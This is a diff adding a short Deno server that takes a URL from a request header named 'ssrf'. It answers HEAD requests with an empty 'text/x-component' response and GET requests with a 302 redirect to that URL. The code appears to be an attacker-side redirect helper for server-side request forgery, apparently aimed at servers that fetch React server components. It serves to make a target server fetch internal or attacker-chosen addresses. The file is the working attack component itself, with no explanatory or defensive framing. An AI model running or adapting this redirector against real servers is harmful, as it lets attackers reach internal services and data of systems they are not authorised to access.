@@ -1,0 +1,28 @@
+Deno.serve((request: Request) => {
+    const ssrf = request.headers.get('ssrf') || 'https://example.com';
+
+    console.log("Request received: " + JSON.stringify({
+        url: request.url,
+        method: request.method,
+        ssrf: ssrf,
+    }));
+
+    console.log(`Redirecting to: ${ssrf}`);
+
+    if (request.method === 'HEAD') {
+        return new Response(null, {
+            headers: {
+                'Content-Type': 'text/x-component',
+            },
+        });
+    }
+
+    if (request.method === 'GET') {
+        return new Response(null, {
+            status: 302,
+            headers: {
+                Location: `${ssrf}`,
+            },
+        });
+    }
+});
